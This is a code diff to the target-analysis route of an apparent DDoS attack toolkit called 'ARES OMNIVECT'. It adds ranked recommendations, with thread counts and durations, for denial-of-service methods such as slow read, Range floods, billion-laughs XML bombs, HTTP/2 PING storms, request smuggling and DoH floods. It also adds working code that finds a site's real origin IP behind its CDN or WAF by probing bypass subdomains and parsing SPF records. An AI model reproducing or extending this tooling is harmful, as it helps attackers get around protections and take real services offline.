@@ -1,10 +1,10 @@
 /**
- * ANALYZE ROUTE — intelligent target profiling (v2)
+ * ANALYZE ROUTE — intelligent target profiling (v3)
  *
  * Probes the target deeply: HTTP/HTTPS, port scanning, WAF detection,
  * HTTP/2 + HTTP/3 support, GraphQL endpoint, WebSocket support,
- * TLS info, CDN/WAF provider, and produces server-aware ranked
- * recommendations for all 23 ARES OMNIVECT attack vectors.
+ * TLS info, CDN/WAF provider, origin IP discovery, and produces server-aware
+ * ranked recommendations for all 30 ARES OMNIVECT ∞ attack vectors.
  *
  * Server-aware scoring:
  *   nginx       → conn-flood S (worker_connections), http-pipeline A, slowloris B
@@ -568,6 +568,98 @@ function scoreMethodsFor(opts: {
     });
   }
 
+  // ── Slow Read (TCP Buffer Exhaustion) ─────────────────────────────────
+  if (httpAvailable || httpsAvailable) {
+    const apacheBonus = serverType === "apache" ? 15 : 0;   // Apache holds thread per conn
+    const iisBonus    = serverType === "iis"    ? 10 : 0;
+    const base        = hasWAF ? 55 : (isIP ? 78 : 65);
+    const score       = Math.min(99, base + apacheBonus + iisBonus);
+    recs.push({
+      method: "slow-read", name: "Slow Read [TCP buffer exhaust]",
+      score, tier: tierFromScore(score),
+      reason: `Pauses TCP reading after request — fills server send buffer, blocking server thread indefinitely. ${serverType === "apache" ? "Apache thread-per-request model makes this extremely effective." : "Effective against any threaded server."}`,
+      suggestedThreads: 500, suggestedDuration: 120, protocol: "TCP/HTTP",
+    });
+  }
+
+  // ── HTTP Range Flood (Multi-Range Exhaustion) ──────────────────────────
+  if (httpAvailable || httpsAvailable) {
+    const nginxBonus = serverType === "nginx" ? 10 : 0;
+    const base       = isCDN ? 48 : (isIP ? 72 : 62);
+    const score      = Math.min(99, base + nginxBonus);
+    recs.push({
+      method: "range-flood", name: "HTTP Range Flood [500×1-byte ranges]",
+      score, tier: tierFromScore(score),
+      reason: "Range: bytes=0-0,...,499-499 forces server to validate all 500 ranges, build multipart response, perform 500× disk seeks per request. Multiplies I/O cost 500×.",
+      suggestedThreads: 600, suggestedDuration: 60, protocol: "HTTP",
+    });
+  }
+
+  // ── XML Bomb / XXE DoS ─────────────────────────────────────────────────
+  if (httpAvailable || httpsAvailable) {
+    const base  = isCDN ? 35 : (isIP ? 58 : 48);
+    const score = Math.min(99, base);
+    recs.push({
+      method: "xml-bomb", name: "XML Bomb [billion-laughs XXE]",
+      score, tier: tierFromScore(score),
+      reason: "Posts billion-laughs XML to SOAP/XMLRPC/XML-REST endpoints. If server parses XML without entity limits, entity expansion causes GB-level memory/CPU exhaustion.",
+      suggestedThreads: 80, suggestedDuration: 45, protocol: "HTTP/XML",
+    });
+  }
+
+  // ── H2 PING Storm ──────────────────────────────────────────────────────
+  if (supportsH2 && httpsAvailable) {
+    const h2bonus = serverType === "nginx" ? 12 : (serverType === "apache" ? 10 : 5);
+    const base    = isCDN ? 60 : (isIP ? 80 : 72);
+    const score   = Math.min(99, base + h2bonus);
+    recs.push({
+      method: "h2-ping-storm", name: "H2 PING Storm [RFC 7540 §6.7]",
+      score, tier: tierFromScore(score),
+      reason: "Every HTTP/2 PING frame must be ACK'd by server (mandatory per RFC). Sends 10K PINGs/s per connection — forces context switch + ACK allocation for each. Massive CPU drain.",
+      suggestedThreads: 1000, suggestedDuration: 60, protocol: "HTTP/2",
+    });
+  }
+
+  // ── HTTP Request Smuggling ─────────────────────────────────────────────
+  if (httpAvailable || httpsAvailable) {
+    const proxyBonus = isCDN ? 20 : 0; // CDNs as reverse proxies are often vulnerable to desync
+    const base       = isIP ? 45 : 62;
+    const score      = Math.min(99, base + proxyBonus);
+    recs.push({
+      method: "http-smuggling", name: "HTTP Smuggling [TE/CL desync]",
+      score, tier: tierFromScore(score),
+      reason: `TE/CL header desync exploits parsing inconsistencies between reverse proxy and backend. ${isCDN ? `${cdnProvider} as front-end: CL.TE variant poisons backend queue.` : "Can poison backend request queues."}`,
+      suggestedThreads: 200, suggestedDuration: 60, protocol: "HTTP",
+    });
+  }
+
+  // ── DoH Flood (DNS over HTTPS) ────────────────────────────────────────
+  if (httpAvailable || httpsAvailable) {
+    const base  = isCDN ? 50 : (isIP ? 40 : 52);
+    const score = Math.min(99, base);
+    recs.push({
+      method: "doh-flood", name: "DoH Flood [/dns-query exhaustion]",
+      score, tier: tierFromScore(score),
+      reason: "Floods /dns-query with RFC 8484 wire-format DNS queries for random domains. Forces recursive DNS resolution, exhausting resolver thread pool and upstream DNS bandwidth.",
+      suggestedThreads: 200, suggestedDuration: 60, protocol: "HTTP/DNS",
+    });
+  }
+
+  // ── Keepalive Exhaust ─────────────────────────────────────────────────
+  if (httpAvailable || httpsAvailable) {
+    const apacheBonus = serverType === "apache" ? 20 : 0; // MaxKeepAliveRequests default=100
+    const nodeBonus   = serverType === "node"   ? 15 : 0;
+    const nginxBonus  = serverType === "nginx"  ? 10 : 0;
+    const base        = hasWAF ? 55 : (isIP ? 75 : 68);
+    const score       = Math.min(99, base + apacheBonus + nodeBonus + nginxBonus);
+    recs.push({
+      method: "keepalive-exhaust", name: "Keepalive Exhaust [128-req pipeline]",
+      score, tier: tierFromScore(score),
+      reason: `Pipelines 128 requests per keep-alive connection without waiting for responses. Saturates server's keep-alive thread pool. ${serverType === "apache" ? "Apache MaxKeepAliveRequests=100 by default — each connection maxes it out." : "Holds server worker threads until all requests processed."}`,
+      suggestedThreads: 500, suggestedDuration: 60, protocol: "HTTP",
+    });
+  }
+
   // Deduplicate and sort: real methods above simulated at equal score, all returned (no limit)
   return recs.sort((a, b) => {
     if (b.score !== a.score) return b.score - a.score;
@@ -745,6 +837,73 @@ router.post("/analyze", async (req, res): Promise<void> => {
   }
   openPorts.sort((a, b) => a - b);
 
+  // ── Origin IP Discovery — find the real server IP behind CDN/WAF ────────
+  // Strategy 1: probe common subdomains that are often NOT behind CDN
+  // Strategy 2: parse SPF TXT record which often contains the real IP
+  // Strategy 3: check HTTP response for real-IP hints (X-Origin-Server, etc.)
+  let originIP: string | null   = null;
+  let originSubdomain: string | null = null;
+  if (isCDN && !isIPv4 && hasDNS) {
+    const CDN_BYPASS_SUBS = [
+      "direct", "mail", "smtp", "ftp", "cpanel", "whm", "webmail",
+      "www2", "origin", "backend", "server", "api", "app", "cdn-origin",
+      "real", "direct-connect", "o1", "admin", "staging",
+    ];
+    // Resolve all subdomains concurrently
+    const subResults = await Promise.all(
+      CDN_BYPASS_SUBS.map(async (sub) => {
+        try {
+          const fqdn = `${sub}.${hostname}`;
+          const ips  = await dns.resolve4(fqdn);
+          return { sub, fqdn, ips };
+        } catch { return null; }
+      })
+    );
+    // Find a subdomain that resolves to a different IP than the CDN
+    for (const r of subResults) {
+      if (!r) continue;
+      const subIp = r.ips[0];
+      if (subIp && !allIPs.includes(subIp)) {
+        // Verify it responds on port 80/443 (real origin, not another CDN)
+        const isOpen = await new Promise<boolean>((res) => {
+          const s = net.createConnection({ host: subIp, port: 443 });
+          s.setTimeout(1500);
+          s.once("connect",  () => { s.destroy(); res(true);  });
+          s.once("timeout",  () => { s.destroy(); res(false); });
+          s.once("error",    () => { s.destroy(); // Try port 80
+            const s2 = net.createConnection({ host: subIp, port: 80 });
+            s2.setTimeout(1000);
+            s2.once("connect", () => { s2.destroy(); res(true); });
+            s2.once("timeout", () => { s2.destroy(); res(false); });
+            s2.once("error",   () => { s2.destroy(); res(false); });
+          });
+        });
+        if (isOpen) { originIP = subIp; originSubdomain = r.fqdn; break; }
+      }
+    }
+    // Strategy 2: parse SPF record for "ip4:" hints
+    if (!originIP) {
+      try {
+        const txts = await dns.resolveTxt(hostname);
+        for (const parts of txts) {
+          const spf = parts.join(" ");
+          if (!spf.startsWith("v=spf1")) continue;
+          const m = spf.match(/ip4:([\d.]+)/g);
+          if (m) {
+            for (const entry of m) {
+              const candidate = entry.slice(4).split("/")[0]; // strip CIDR
+              if (candidate && !allIPs.includes(candidate)) {
+                originIP = candidate;
+                break;
+              }
+            }
+          }
+          if (originIP) break;
+        }
+      } catch { /* no SPF */ }
+    }
+  }
+
   // GraphQL probe (fire & forget, quick timeout)
   const baseUrl = httpsAvailable ? `https://${hostname}` : `http://${hostname}`;
   const hasGraphQL = (httpAvailable || httpsAvailable)
@@ -775,10 +934,11 @@ router.post("/analyze", async (req, res): Promise<void> => {
   });
 
   res.json({
-    target:        hostname,
+    target:          hostname,
     ip,
     allIPs,
-    isIP:          isIPv4,
+    isIP:            isIPv4,
+    hasDNS,
     httpAvailable,
     httpsAvailable,
     responseTimeMs,
@@ -797,6 +957,8 @@ router.post("/analyze", async (req, res): Promise<void> => {
     hasGraphQL,
     hasWebSocket,
     openPorts,
+    originIP,
+    originSubdomain,
     recommendations,
   });
 });
